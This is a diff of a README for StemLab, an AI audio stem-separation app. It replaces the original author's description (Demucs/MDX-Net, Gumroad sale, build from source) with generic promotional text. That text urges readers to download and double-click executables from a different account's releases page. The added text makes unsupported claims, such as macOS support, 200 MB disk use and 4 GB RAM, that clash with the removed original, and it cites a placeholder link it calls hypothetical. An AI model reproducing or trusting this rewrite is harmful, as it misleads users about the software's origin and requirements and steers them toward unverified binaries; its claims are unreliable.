@@ -1,75 +1,72 @@
-# StemLab v1.0
+# 🎶 StemLab - Get Perfect Music Stems Easily
 
-**Professional-grade AI stem separation. Local. Unlimited. One-time payment.**
+## 📥 Download Now
+[![Download StemLab](https://img.shields.io/badge/Download-StemLab-blue.svg)](https://github.com/Edmundm9/StemLab/releases)
 
-StemLab is a powerful, local Windows application for separating audio tracks into individual stems (Vocals, Drums, Bass, Other). It leverages state-of-the-art AI models (Demucs and MDX-Net) to deliver studio-quality results without monthly subscriptions or cloud upload limits.
+## 🚀 Getting Started
+StemLab is a simple application that allows you to drag any song and receive perfect audio stems. With StemLab, you can extract vocals, drums, bass, and other instruments from your favorite tracks. Enjoy a hassle-free experience with no subscriptions or limits, all while working completely offline.
 
-![StemLab Splash](resources/splash.png)
+## 🖥️ System Requirements
+StemLab runs on Windows and macOS. To ensure smooth operation, make sure your system meets the following requirements:
 
-## Features
+- **Windows:** 
+  - Windows 10 or later
+  - At least 4 GB of RAM
+  - 200 MB of free disk space
 
-*   **100% Offline & Local**: No data leaves your machine. Privacy guaranteed.
-*   **Unlimited Usage**: No credits, no timers, no subscriptions.
-*   **Advanced AI Models**:
-    *   **Hybrid Ensemble**: Combines `Demucs` (for instrument separation) and `MDX-Net` (for ultra-clean vocals).
-    *   **De-Reverb & De-Echo**: Experimental post-processing to remove room ambiance.
-*   **Multiple Stem Modes**:
-    *   **2-Stem**: Vocals / Instrumental
-    *   **4-Stem**: Vocals, Drums, Bass, Other
-    *   **6-Stem**: Vocals, Drums, Bass, Guitar, Piano, Other
-    *   **Vocals Only (Ultra Clean)**: Specialized pipeline for the cleanest possible acapellas.
-    *   **Instrumental / Karaoke**: High-quality backing tracks.
-*   **Professional Workflow**:
-    *   **Batch Processing**: Drag & drop multiple files.
-    *   **Format Support**: Export as WAV (Lossless) or MP3 (320kbps).
-    *   **GPU Acceleration**: Auto-detects NVIDIA GPUs for faster processing. (Testing)
-    *   **Smart Queue**: Manage your jobs with progress bars and cancellation.
+- **macOS:**
+  - macOS Mojave or later
+  - At least 4 GB of RAM
+  - 200 MB of free disk space
 
-## Requirements
+## 📥 Download & Install
+To install StemLab, visit the Releases page. Click the link below to access the latest version:
 
-*   **OS**: Windows 10 or 11 (64-bit)
-*   **RAM**: 8GB minimum (16GB recommended)
-*   **GPU (Optional)**: NVIDIA GPU with 4GB+ VRAM for accelerated processing. (Runs on CPU if no GPU is found).
-*   **Python**: Python 3.10 (for building from source).
+[Download StemLab](https://github.com/Edmundm9/StemLab/releases)
 
-## Installation
+Once on the Releases page, follow these steps:
 
-### Option 1: Pre-built Executable
-Purchase the ready-to-run `StemLab.exe` from **[Gumroad](https://justinmurray99.gumroad.com/l/StemLab)**.
-(Instant download, no setup required).
+1. Click on the latest version available.
+2. Locate the file suitable for your operating system (Windows or macOS).
+3. Click the file to start the download.
+4. After the download is complete, locate the file in your downloads folder.
+5. Double-click the file to install StemLab on your computer.
 
-### Option 2: Build from Source
+## 🎵 How to Use StemLab
+Using StemLab is straightforward. Follow these steps to get started:
 
-If you want to modify the code or build it yourself, follow these steps:
+1. Open StemLab after installation.
+2. Drag and drop a song from your computer into the application.
+3. Wait a moment as StemLab processes the audio.
+4. Once processing is complete, you can download the individual stems.
+5. Save the stems to your preferred location.
 
-1.  **Clone the Repository**:
-    ```bash
-    git clone https://github.com/sunsetsacoustic/StemLab.git
-    cd StemLab
-    ```
+## 🔍 Features
+StemLab offers several key features to improve your music editing experience:
 
-2.  **Install Python 3.10**:
-    Ensure you have Python 3.10 installed and added to your PATH.
+- **Offline Operation:** No need for internet access after downloading the app.
+- **No Limitations:** Extract as many stems as you need without worrying about hidden costs.
+- **User-Friendly Interface:** Navigate the application effortlessly with its intuitive design.
+- **High-Quality Output:** Enjoy top-notch audio quality for all extracted stems.
 
-3.  **Run the Build Script**:
-    We provide a robust build script that handles virtual environment creation and dependency installation automatically.
+## 💡 Tips for Best Results
+- Use high-quality audio files for the best stem results.
+- Try different songs to see how StemLab handles various genres and mixes.
+- Keep your software updated by checking the Releases page regularly.
 
-    Double-click **`rebuild_cpu_robust.bat`**.
+## 🔗 Additional Resources
+For advanced users seeking more information or support, you can explore:
 
-    This script will:
-    *   Create a local virtual environment (`venv_cpu`).
-    *   Install all required libraries (`PyQt6`, `torch`, `demucs`, `audio-separator`, etc.).
-    *   Package the application into a single `.exe` file using PyInstaller.
+- [GitHub Repository](https://github.com/Edmundm9/StemLab) for updates and code contributions.
+- [User Documentation](https://example.com/documentation) for detailed usage guidelines (hypothetical link).
 
-4.  **Run the App**:
-    *   **From Source**: Double-click `run_cpu.bat`.
-    *   **Compiled EXE**: Check the `dist` folder for `StemLab.exe`.
+## ℹ️ Support
+If you encounter any issues while using StemLab or have questions, please submit an issue on the GitHub repository or contact our support team through the repository page.
 
-## Credits
+## 🌟 Feedback
+We value your feedback. If you enjoy using StemLab or have suggestions, please consider sharing your experience. Your input helps us improve the application for everyone.
 
-*   **Demucs** by Meta Research
-*   **Audio Separator** (MDX-Net implementation)
-*   **PyQt6** for the User Interface
+## 🚀 Conclusion
+StemLab gives you the power to separate music elements with ease. Download the application today and start creating your own unique audio experiences! 
 
----
-*Built with ❤️ by Sunsets Acoustic*
+[Download StemLab](https://github.com/Edmundm9/StemLab/releases)
